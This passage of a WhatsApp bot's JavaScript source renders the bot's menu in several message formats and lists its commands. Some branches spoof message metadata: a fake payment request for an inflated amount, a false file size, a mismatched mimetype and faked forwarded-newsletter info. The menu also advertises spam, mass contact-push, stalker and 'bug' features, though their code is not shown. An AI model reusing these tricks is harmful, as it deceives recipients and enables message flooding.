                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    VeranBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	VeranBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/y0nLDSB/veran-IMG.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }}, {
                        quoted: m
                    })
      } else if (typemenu === 'v9') {
                	VeranBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "100000000000000000@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/y0nLDSB/veran-IMG.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
    {
    "name": "single_select",
    "buttonParamsJson": `{
        "title": "LIST MENU 📃",
        "sections": [
            {
                "title": "${botname}",
                "rows": [
                    {
                        "header": "ALL MENU",
                        "title": "Click to display",
                        "description": "Displays the list of all features",
                        "id": "${prefix}allmenu"
                    },
                    {
                        "header": "SEARCH MENU",
                        "title": "Click to display",
                        "description": "Displays the list of search features",
                        "id": "${prefix}searchmenu"
                    },
                    {
                        "header": "DOWNLOAD MENU",
                        "title": "Click to display",
                        "description": "Displays the list of download features",
                        "id": "${prefix}downloadmenu"
                    },
                    {
                        "header": "GAME MENU",
                        "title": "Click to display",
                        "description": "Displays the list of game features",
                        "id": "${prefix}gamemenu"
                    },
                    {
                        "header": "FUN MENU",
                        "title": "Click to display",
                        "description": "Displays the list of fun features",
                        "id": "${prefix}funmenu"
                    },
                    {
                        "header": "AI MENU",
                        "title": "Click to display",
                        "description": "Displays the list of AI features",
                        "id": "${prefix}aimenu"
                    },
                    {
                        "header": "GROUP MENU",
                        "title": "Click to display",
                        "description": "Displays the list of group management features",
                        "id": "${prefix}groupmenu"
                    },
                    {
                        "header": "OWNER MENU",
                        "title": "Click to display",
                        "description": "Displays the list of owner-specific features",
                        "id": "${prefix}ownermenu"
                    },
                    {
                        "header": "CONVERT MENU",
                        "title": "Click to display",
                        "description": "Displays the list of convert features",
                        "id": "${prefix}convertmenu"
                    },
                    {
                        "header": "LIST MENU",
                        "title": "Click to display",
                        "description": "Displays the list of list features",
                        "id": "${prefix}listmenu"
                    },
                    {
                        "header": "RELIGION MENU",
                        "title": "Click to display",
                        "description": "Displays the list of religion features",
                        "id": "${prefix}religionmenu"
                    },
                    {
                        "header": "ANIME MENU",
                        "title": "Click to display",
                        "description": "Displays the list of anime features",
                        "id": "${prefix}animemenu"
                    },
                    {
                        "header": "RANDOM PHOTO MENU",
                        "title": "Click to display",
                        "description": "Displays the list of random photo features",
                        "id": "${prefix}randomphotomenu"
                    },
                    {
                        "header": "RANDOM VIDEO MENU",
                        "title": "Click to display",
                        "description": "Displays the list of random video features",
                        "id": "${prefix}randomvideomenu"
                    },
                    {
                        "header": "STICKER MENU",
                        "title": "Click to display",
                        "description": "Displays the list of sticker features",
                        "id": "${prefix}stickermenu"
                    },
                    {
                        "header": "DATABASE MENU",
                        "title": "Click to display",
                        "description": "Displays the list of database features",
                        "id": "${prefix}databasemenu"
                    },
                    {
                        "header": "STORE MENU",
                        "title": "Click to display",
                        "description": "Displays the list of store features",
                        "id": "${prefix}storemenu"
                    },
                    {
                        "header": "STALKER MENU",
                        "title": "Click to display",
                        "description": "Displays the list of stalker features",
                        "id": "${prefix}stalkermenu"
                    },
                    {
                        "header": "BUG MENU",
                        "title": "Click to display",
                        "description": "Displays the list of bug features",
                        "id": "${prefix}bugmenu"
                    },
                    {
                        "header": "OTHER MENU",
                        "title": "Click to display",
                        "description": "Displays the list of other features",
                        "id": "${prefix}othermenu"
                    }
                ]
            }
        ]
    }`
},
{                  
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"*Follow* 🌚 \",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
    "name": "single_select",
    "buttonParamsJson": `{
        "title": "LIST MENU 📃",
        "sections": [
            {
                "title": "${botname}",
                "rows": [
                    {
                        "header": "ALL MENU",
                        "title": "Click to display",
                        "description": "Displays the list of all features",
                        "id": "${prefix}allmenu"
                    },
                    {
                        "header": "SEARCH MENU",
                        "title": "Click to display",
                        "description": "Displays the list of search features",
                        "id": "${prefix}searchmenu"
                    },
                    {
                        "header": "DOWNLOAD MENU",
                        "title": "Click to display",
                        "description": "Displays the list of download features",
                        "id": "${prefix}downloadmenu"
                    },
                    {
                        "header": "GAME MENU",
                        "title": "Click to display",
                        "description": "Displays the list of game features",
                        "id": "${prefix}gamemenu"
                    },
                    {
                        "header": "FUN MENU",
                        "title": "Click to display",
                        "description": "Displays the list of fun features",
                        "id": "${prefix}funmenu"
                    },
                    {
                        "header": "AI MENU",
                        "title": "Click to display",
                        "description": "Displays the list of AI features",
                        "id": "${prefix}aimenu"
                    },
                    {
                        "header": "GROUP MENU",
                        "title": "Click to display",
                        "description": "Displays the list of group management features",
                        "id": "${prefix}groupmenu"
                    },
                    {
                        "header": "OWNER MENU",
                        "title": "Click to display",
                        "description": "Displays the list of owner-specific features",
                        "id": "${prefix}ownermenu"
                    },
                    {
                        "header": "CONVERT MENU",
                        "title": "Click to display",
                        "description": "Displays the list of convert features",
                        "id": "${prefix}convertmenu"
                    },
                    {
                        "header": "LIST MENU",
                        "title": "Click to display",
                        "description": "Displays the list of list features",
                        "id": "${prefix}listmenu"
                    },
                    {
                        "header": "RELIGION MENU",
                        "title": "Click to display",
                        "description": "Displays the list of religion features",
                        "id": "${prefix}religionmenu"
                    },
                    {
                        "header": "ANIME MENU",
                        "title": "Click to display",
                        "description": "Displays the list of anime features",
                        "id": "${prefix}animemenu"
                    },
                    {
                        "header": "RANDOM PHOTO MENU",
                        "title": "Click to display",
                        "description": "Displays the list of random photo features",
                        "id": "${prefix}randomphotomenu"
                    },
                    {
                        "header": "RANDOM VIDEO MENU",
                        "title": "Click to display",
                        "description": "Displays the list of random video features",
                        "id": "${prefix}randomvideomenu"
                    },
                    {
                        "header": "STICKER MENU",
                        "title": "Click to display",
                        "description": "Displays the list of sticker features",
                        "id": "${prefix}stickermenu"
                    },
                    {
                        "header": "DATABASE MENU",
                        "title": "Click to display",
                        "description": "Displays the list of database features",
                        "id": "${prefix}databasemenu"
                    },
                    {
                        "header": "STORE MENU",
                        "title": "Click to display",
                        "description": "Displays the list of store features",
                        "id": "${prefix}storemenu"
                    },
                    {
                        "header": "STALKER MENU",
                        "title": "Click to display",
                        "description": "Displays the list of stalker features",
                        "id": "${prefix}stalkermenu"
                    },
                    {
                        "header": "BUG MENU",
                        "title": "Click to display",
                        "description": "Displays the list of bug features",
                        "id": "${prefix}bugmenu"
                    },
                    {
                        "header": "OTHER MENU",
                        "title": "Click to display",
                        "description": "Displays the list of other features",
                        "id": "${prefix}othermenu"
                    }
                ]
            }
        ]
    }`
},
{

                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"*Follow* 🌚\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
    "name": "single_select",
    "buttonParamsJson": `{
        "title": "LIST MENU 📃",
        "sections": [
            {
                "title": "${botname}",
                "rows": [
                    {
                        "header": "ALL MENU",
                        "title": "Click to display",
                        "description": "Displays the list of all features",
                        "id": "${prefix}allmenu"
                    },
                    {
                        "header": "SEARCH MENU",
                        "title": "Click to display",
                        "description": "Displays the list of search features",
                        "id": "${prefix}searchmenu"
                    },
                    {
                        "header": "DOWNLOAD MENU",
                        "title": "Click to display",
                        "description": "Displays the list of download features",
                        "id": "${prefix}downloadmenu"
                    },
                    {
                        "header": "GAME MENU",
                        "title": "Click to display",
                        "description": "Displays the list of game features",
                        "id": "${prefix}gamemenu"
                    },
                    {
                        "header": "FUN MENU",
                        "title": "Click to display",
                        "description": "Displays the list of fun features",
                        "id": "${prefix}funmenu"
                    },
                    {
                        "header": "AI MENU",
                        "title": "Click to display",
                        "description": "Displays the list of AI features",
                        "id": "${prefix}aimenu"
                    },
                    {
                        "header": "GROUP MENU",
                        "title": "Click to display",
                        "description": "Displays the list of group management features",
                        "id": "${prefix}groupmenu"
                    },
                    {
                        "header": "OWNER MENU",
                        "title": "Click to display",
                        "description": "Displays the list of owner-specific features",
                        "id": "${prefix}ownermenu"
                    },
                    {
                        "header": "CONVERT MENU",
                        "title": "Click to display",
                        "description": "Displays the list of convert features",
                        "id": "${prefix}convertmenu"
                    },
                    {
                        "header": "LIST MENU",
                        "title": "Click to display",
                        "description": "Displays the list of list features",
                        "id": "${prefix}listmenu"
                    },
                    {
                        "header": "RELIGION MENU",
                        "title": "Click to display",
                        "description": "Displays the list of religion features",
                        "id": "${prefix}religionmenu"
                    },
                    {
                        "header": "ANIME MENU",
                        "title": "Click to display",
                        "description": "Displays the list of anime features",
                        "id": "${prefix}animemenu"
                    },
                    {
                        "header": "RANDOM PHOTO MENU",
                        "title": "Click to display",
                        "description": "Displays the list of random photo features",
                        "id": "${prefix}randomphotomenu"
                    },
                    {
                        "header": "RANDOM VIDEO MENU",
                        "title": "Click to display",
                        "description": "Displays the list of random video features",
                        "id": "${prefix}randomvideomenu"
                    },
                    {
                        "header": "STICKER MENU",
                        "title": "Click to display",
                        "description": "Displays the list of sticker features",
                        "id": "${prefix}stickermenu"
                    },
                    {
                        "header": "DATABASE MENU",
                        "title": "Click to display",
                        "description": "Displays the list of database features",
                        "id": "${prefix}databasemenu"
                    },
                    {
                        "header": "STORE MENU",
                        "title": "Click to display",
                        "description": "Displays the list of store features",
                        "id": "${prefix}storemenu"
                    },
                    {
                        "header": "STALKER MENU",
                        "title": "Click to display",
                        "description": "Displays the list of stalker features",
                        "id": "${prefix}stalkermenu"
                    },
                    {
                        "header": "BUG MENU",
                        "title": "Click to display",
                        "description": "Displays the list of bug features",
                        "id": "${prefix}bugmenu"
                    },
                    {
                        "header": "OTHER MENU",
                        "title": "Click to display",
                        "description": "Displays the list of other features",
                        "id": "${prefix}othermenu"
                    }
                ]
            }
        ]
    }`
},
{

                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"CHANNEL 👥\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}  
}


break
case 'allmenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${veranytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *✓ = For Owner* 
├ *√ = For Free User*
├ *√ = For Premium User*
╰─┬────❍
╭─┴❍「 *Owner* 」❍
│${setv} ${prefix}*addbadword✓*
│${setv} ${prefix}*delbadword✓*
│${setv} ${prefix}*autoread✓*
│${setv} ${prefix}*autobio✓*
│${setv} ${prefix}*autotype✓*
│${setv} ${prefix}*unavailable✓*
│${setv} ${prefix}*autorecord✓*
│${setv} ${prefix}*autorecordtype✓*
│${setv} ${prefix}*autostatusview✓*
│${setv} ${prefix}*setautoblock✓*
│${setv} ${prefix}*setantiforeign✓*
│${setv} ${prefix}*autoblock✓*
│${setv} ${prefix}*onlygc✓*
│${setv} ${prefix}*onlypc✓*
│${setv} ${prefix}*onlyindia✓*
│${setv} ${prefix}*onlyindo✓*
│${setv} ${prefix}*anticall✓*
│${setv} ${prefix}*self✓*
│${setv} ${prefix}*public✓*
│${setv} ${prefix}*join✓*
│${setv} ${prefix}*poll✓*
│${setv} ${prefix}*spam✓*
│${setv} ${prefix}*bc✓*
│${setv} ${prefix}*bcgroup✓*
│${setv} ${prefix}*setmenu✓*
│${setv} ${prefix}*setimgmenu✓*
│${setv} ${prefix}*setvidmenu✓*
│${setv} ${prefix}*setgifmenu✓*
│${setv} ${prefix}*setreply✓*
│${setv} ${prefix}*resethit✓*
│${setv} ${prefix}*resetuser✓*
│${setv} ${prefix}*creategc✓*
│${setv} ${prefix}*setexif✓*
│${setv} ${prefix}*getexif✓*
│${setv} ${prefix}*getautoblocknumber✓*
│${setv} ${prefix}*getantiforeignnumber✓*
│${setv} ${prefix}*userjid✓*
│${setv} ${prefix}*setbotbio✓*
│${setv} ${prefix}*delppbot✓*
│${setv} ${prefix}*shutdown✓*
│${setv} ${prefix}*setppbot✓*
│${setv} ${prefix}*addprem✓*
│${setv} ${prefix}*delprem✓*
│${setv} ${prefix}*addowner✓*
│${setv} ${prefix}*delowner✓*
│${setv} ${prefix}*addvn✓*
│${setv} ${prefix}*addapk✓*
│${setv} ${prefix}*addzip✓*
│${setv} ${prefix}*addpdf✓*
│${setv} ${prefix}*delapk✓*
│${setv} ${prefix}*delzip✓*
│${setv} ${prefix}*delpdf✓*
│${setv} ${prefix}*delvn✓*
│${setv} ${prefix}*addsticker✓*
│${setv} ${prefix}*delsticker✓*
│${setv} ${prefix}*addimage✓*
│${setv} ${prefix}*delimage✓*
│${setv} ${prefix}*addvideo✓*
│${setv} ${prefix}*delvideo✓*
│${setv} ${prefix}*upswtext✓*
│${setv} ${prefix}*upswvideo✓*
│${setv} ${prefix}*upswimage✓*
│${setv} ${prefix}*upswaudio✓*
│${setv} ${prefix}*autosticker✓*
│${setv} ${prefix}*block✓*
│${setv} ${prefix}*unblock✓*
│${setv} ${prefix}*leavegc✓*
│${setv} ${prefix}*pushcontact✓*
│${setv} ${prefix}*pushcontactv2✓*
│${setv} ${prefix}*pushcontactv3✓*
│${setv} ${prefix}*jpm✓*
│${setv} ${prefix}*checkmember✓*
│${setv} ${prefix}*post✓*
│${setv} ${prefix}*clearchat✓*
│${setv} ${prefix}*setprefix✓*
│${setv} ${prefix}*channel✓*
│${setv} ${prefix}*link✓*
│${setv} *$✓*
│${setv} *>✓*
│${setv} *<✓*
╰─┬────❍
╭─┴❍「 *Group* 」❍
│${setv} ${prefix}*antibot ∆*
│${setv} ${prefix}*antivv ∆*
│${setv} ${prefix}*vv ∆*
│${setv} ${prefix}*welcome ∆*
│${setv} ${prefix}*adminevent ∆*
│${setv} ${prefix}*groupevent ∆*
│${setv} ${prefix}*antiforeign ∆*
│${setv} ${prefix}*antimedia ∆*
│${setv} ${prefix}*antiaudio ∆*
│${setv} ${prefix}*antivideo ∆*
│${setv} ${prefix}*antiimage ∆*
│${setv} ${prefix}*antidocument ∆*
│${setv} ${prefix}*antilocation ∆*
│${setv} ${prefix}*anticontact ∆*
│${setv} ${prefix}*antisticker ∆*
│${setv} ${prefix}*antipoll ∆*
│${setv} ${prefix}*antilink ∆*
│${setv} ${prefix}*antipromotion ∆*
│${setv} ${prefix}*antivirtex ∆*
│${setv} ${prefix}*grouplink ∆*
│${setv} ${prefix}*listadmin ∆*
│${setv} ${prefix}*invite ∆*
│${setv} ${prefix}*ephemeral ∆*
│${setv} ${prefix}*delete ∆*
│${setv} ${prefix}*setppgroup ∆*
│${setv} ${prefix}*delppgroup ∆*
│${setv} ${prefix}*setnamegc ∆*
│${setv} ${prefix}*setdesc ∆*
│${setv} ${prefix}*add ∆*
│${setv} ${prefix}*kick ∆*
│${setv} ${prefix}*promote ∆*
│${setv} ${prefix}*demote ∆*
│${setv} ${prefix}*kickall ∆*
│${setv} ${prefix}*promoteall ∆*
│${setv} ${prefix}*demoteall ∆*
│${setv} ${prefix}*getcontact✓*
│${setv} ${prefix}*savecontact✓*
│${setv} ${prefix}*sendcontact✓*
│${setv} ${prefix}*contactag✓*
│${setv} ${prefix}*hidetag ∆*
│${setv} ${prefix}*totag ∆*
│${setv} ${prefix}*tagall ∆*
│${setv} ${prefix}*editinfo ∆*
│${setv} ${prefix}*opentime ∆*
│${setv} ${prefix}*closetime ∆*
│${setv} ${prefix}*resetlink ∆*
│${setv} ${prefix}*getbio ∆*
│${setv} ${prefix}*vote ∆*
│${setv} ${prefix}*upvote ∆*
│${setv} ${prefix}*downvote ∆*
│${setv} ${prefix}*checkvote ∆*
│${setv} ${prefix}*delvote ∆*
│${setv} ${prefix}*antivirus ∆*
│${setv} ${prefix}*antibadword ∆*
│${setv} ${prefix}*nsfw ∆*
│${setv} ${prefix}*react ∆*
│${setv} ${prefix}*getjoinrequest ∆*
╰─┬────❍
╭─┴❍「 *Search* 」❍
│${setv} ${prefix}*google√*
│${setv} ${prefix}*wikipedia√*
│${setv} ${prefix}*ytsearch√*
│${setv} ${prefix}*apksearch√*
│${setv} ${prefix}*stickersearch√*
│${setv} ${prefix}*imdb√*
│${setv} ${prefix}*wanumber√*
│${setv} ${prefix}*friend√*
│${setv} ${prefix}*lyrics√*
│${setv} ${prefix}*pixiv√*
│${setv} ${prefix}*ssc*
│${setv} ${prefix}*soundcloud*
╰─┬────❍
╭─┴❍「 *Download* 」❍
│${setv} ${prefix}*itunes√*
│${setv} ${prefix}*play√*
│${setv} ${prefix}*ytmp3√*
│${setv} ${prefix}*ytmp4√*
│${setv} ${prefix}*tiktok√*
│${setv} ${prefix}*tiktokaudio√*
│${setv} ${prefix}*tiktokvideo√*
│${setv} ${prefix}*igvideo√*
│${setv} ${prefix}*igimage√*
│${setv} ${prefix}*facebook√*
│${setv} ${prefix}*twitter√*
│${setv} ${prefix}*bilibili√*
│${setv} ${prefix}*dailymotion√*
│${setv} ${prefix}*apk√*
│${setv} ${prefix}*modwa√*
│${setv} ${prefix}*mega√*
│${setv} ${prefix}*mediafire√*
│${setv} ${prefix}*google√*
│${setv} ${prefix}*gimage√*
│${setv} ${prefix}*weather√*
│${setv} ${prefix}*spotify™*
│${setv} ${prefix}*gitclone√*
│${setv} ${prefix}*happymod√*
│${setv} ${prefix}*gdrive√*
│${setv} ${prefix}*pinterest√*
│${setv} ${prefix}*ringtone√*
│${setv} ${prefix}*autodownload✓*
╰─┬────❍
╭─┴❍「 *List Menu* 」❍
│${setv} ${prefix}*listprem√*
│${setv} ${prefix}*listowner√*
│${setv} ${prefix}*liststicker√*
│${setv} ${prefix}*listimage√*
│${setv} ${prefix}*listvideo√*
│${setv} ${prefix}*listvn√*
│${setv} ${prefix}*listapk√*
│${setv} ${prefix}*listzip√*
│${setv} ${prefix}*listpdf√*
│${setv} ${prefix}*listbadword√*
│${setv} ${prefix}*listpc√*
│${setv} ${prefix}*listgc√*
╰─┬────❍
╭─┴❍「 *Random Photo* 」❍
│${setv} ${prefix}*aesthetic√*
│${setv} ${prefix}*coffee√*
│${setv} ${prefix}*wikimedia√*
│${setv} ${prefix}*wallpaper√*
│${setv} ${prefix}*art√*
│${setv} ${prefix}*bts√*
│${setv} ${prefix}*dogwoof√*
│${setv} ${prefix}*catmeow√*
│${setv} ${prefix}*lizardpic√*
│${setv} ${prefix}*goosebird√*
│${setv} ${prefix}*8ballpool√*
│${setv} ${prefix}*cosplay√*
│${setv} ${prefix}*hacker√*
│${setv} ${prefix}*cyber√*
│${setv} ${prefix}*gamewallpaper√*
│${setv} ${prefix}*islamic√*
│${setv} ${prefix}*jennie√*
│${setv} ${prefix}*jiso√*
│${setv} ${prefix}*satanic√*
│${setv} ${prefix}*justina√*
│${setv} ${prefix}*cartoon√*
│${setv} ${prefix}*pentol√*
│${setv} ${prefix}*cat√*
│${setv} ${prefix}*kpop√*
│${setv} ${prefix}*exo√*
│${setv} ${prefix}*lisa√*
│${setv} ${prefix}*space√*
│${setv} ${prefix}*car√*
│${setv} ${prefix}*technology√*
│${setv} ${prefix}*bike√*
│${setv} ${prefix}*shortquote√*
│${setv} ${prefix}*antiwork√*
│${setv} ${prefix}*hacking√*
│${setv} ${prefix}*boneka√*
│${setv} ${prefix}*rose√*
│${setv} ${prefix}*ryujin√*
│${setv} ${prefix}*ulzzangboy√*
│${setv} ${prefix}*ulzzanggirl√*
│${setv} ${prefix}*wallml√*
│${setv} ${prefix}*wallphone√*
│${setv} ${prefix}*mountain√*
│${setv} ${prefix}*goose√*
│${setv} ${prefix}*profilepic√*
│${setv} ${prefix}*couplepp√*
│${setv} ${prefix}*programming√*
│${setv} ${prefix}*pubg√*
│${setv} ${prefix}*blackpink√*
│${setv} ${prefix}*randomboy√*
│${setv} ${prefix}*randomgirl√*
│${setv} ${prefix}*hijab√*
│${setv} ${prefix}*chinese√*
│${setv} ${prefix}*indo√*
│${setv} ${prefix}*japanese√*
│${setv} ${prefix}*korean√*
│${setv} ${prefix}*malay√*
│${setv} ${prefix}*thai√*
│${setv} ${prefix}*vietnamese√*
╰─┬────❍
╭─┴❍「 *Random Video* 」❍
│${setv} ${prefix}*tiktokgirl√*
│${setv} ${prefix}*tiktoknukthy√*
│${setv} ${prefix}*tiktokkayes√*
│${setv} ${prefix}*tiktokpanrika√*
│${setv} ${prefix}*tiktoknotnot√*
│${setv} ${prefix}*tiktokghea√*
│${setv} ${prefix}*tiktoksantuy√*
│${setv} ${prefix}*tiktokbocil√*
╰─┬────❍
╭─┴❍「 *Stalker* 」❍
│${setv} ${prefix}*tiktokstalk√*
│${setv} ${prefix}*mlstalk√*
│${setv} ${prefix}*npmstalk√*
│${setv} ${prefix}*ghstalk√*
╰─┬────❍
╭─┴❍「 *OpenAI* 」❍
│${setv} ${prefix}*blackboxai√*
│${setv} ${prefix}*travel-assistant√*
│${setv} ${prefix}*guru-ai√*
│${setv} ${prefix}*emi-ai√*
│${setv} ${prefix}*claude-ai√*
│${setv} ${prefix}*hercai-cartoon√*
│${setv} ${prefix}*hercai-animefy√*
│${setv} ${prefix}*hercai-lexica√*
│${setv} ${prefix}*hercai-prodia√*
│${setv} ${prefix}*hercai-simurg√*
│${setv} ${prefix}*hercai-raava√*
│${setv} ${prefix}*hercai-shonin√*
│${setv} ${prefix}*realistic√*
│${setv} ${prefix}*3dmodel√*
│${setv} ${prefix}*photoleap√*
│${setv} ${prefix}*chatgpt4√*
│${setv} ${prefix}*mathsai√*
│${setv} ${prefix}*openai√*
│${setv} ${prefix}*dalle√*
│${setv} ${prefix}*ai√*
│${setv} ${prefix}*remini√*
│${setv} ${prefix}*bing√*
│${setv} ${prefix}*darky√*
│${setv} ${prefix}*checkgpt√*
╰─┬────❍
╭─┴❍「 *Game* 」❍
│${setv} ${prefix}*truth√*
│${setv} ${prefix}*dare√*
│${setv} ${prefix}*suit√*
│${setv} ${prefix}*tictactoe√*
│${setv} ${prefix}*math√*
│${setv} ${prefix}*playbomb√*
│${setv} ${prefix}*casino√*
│${setv} ${prefix}*rob√*
│${setv} ${prefix}*slot√*
│${setv} ${prefix}*dice√*
│${setv} ${prefix}*profile√*
│${setv} ${prefix}*claim√*
│${setv} ${prefix}*tmoney√*
│${setv} ${prefix}*tflimit√*
╰─┬────❍
╭─┴❍「 *Fun* 」❍
│${setv} ${prefix}*define√*
│${setv} ${prefix}*readmore√*
│${setv} ${prefix}*yomamajoke√*
│${setv} ${prefix}*fact√*
│${setv} ${prefix}*couple√*
│${setv} ${prefix}*soulmate√*
│${setv} ${prefix}*stupidcheck√*
│${setv} ${prefix}*handsomecheck√*
│${setv} ${prefix}*uncleancheck√*
│${setv} ${prefix}*hotcheck√*
│${setv} ${prefix}*smartcheck√*
│${setv} ${prefix}*greatcheck√*
│${setv} ${prefix}*evilcheck√*
│${setv} ${prefix}*dogcheck√*
│${setv} ${prefix}*coolcheck√*
│${setv} ${prefix}*waifucheck√*
│${setv} ${prefix}*awesomecheck√*
│${setv} ${prefix}*gaycheck√*
│${setv} ${prefix}*cutecheck√*
│${setv} ${prefix}*lesbiancheck√*
│${setv} ${prefix}*hornycheck√*
│${setv} ${prefix}*prettycheck√*
│${setv} ${prefix}*lovelycheck√*
│${setv} ${prefix}*uglycheck√*
│${setv} ${prefix}*pick√*
│${setv} ${prefix}*pickupline√*
│${setv} ${prefix}*quotes√*
│${setv} ${prefix}*can√*
│${setv} ${prefix}*is√*
│${setv} ${prefix}*when√*
│${setv} ${prefix}*where√*
│${setv} ${prefix}*what√*
│${setv} ${prefix}*how√*
│${setv} ${prefix}*rate√*
│${setv} ${prefix}*cry√*
│${setv} ${prefix}*kill√*
│${setv} ${prefix}*hug√*
│${setv} ${prefix}*pat√*
│${setv} ${prefix}*lick√*
│${setv} ${prefix}*kiss√*
│${setv} ${prefix}*bite√*
│${setv} ${prefix}*yeet√*
│${setv} ${prefix}*bully√*
│${setv} ${prefix}*bonk√*
│${setv} ${prefix}*wink√*
│${setv} ${prefix}*poke√*
│${setv} ${prefix}*nom√*
│${setv} ${prefix}*slap√*
│${setv} ${prefix}*smile√*
│${setv} ${prefix}*wave√*
│${setv} ${prefix}*awoo√*
│${setv} ${prefix}*blush√*
│${setv} ${prefix}*smug√*
│${setv} ${prefix}*glomp√*
│${setv} ${prefix}*happy√*
│${setv} ${prefix}*dance√*
│${setv} ${prefix}*cringe√*
│${setv} ${prefix}*cuddle√*
│${setv} ${prefix}*highfive√*
│${setv} ${prefix}*handhold√*
│${setv} ${prefix}*spank√*
│${setv} ${prefix}*tickle√*
│${setv} ${prefix}*feed√*
│${setv} ${prefix}*checkme√*
│${setv} ${prefix}*sound1 - sound161√*
╰─┬────❍
╭─┴❍「 *Sticker* 」❍
│${setv} ${prefix}*goose√*
│${setv} ${prefix}*woof√*
│${setv} ${prefix}*8ball√*
│${setv} ${prefix}*lizard√*
│${setv} ${prefix}*meow√*
│${setv} ${prefix}*gura√*
│${setv} ${prefix}*telestick√*
╰─┬────❍
╭─┴❍「 *Anime* 」❍
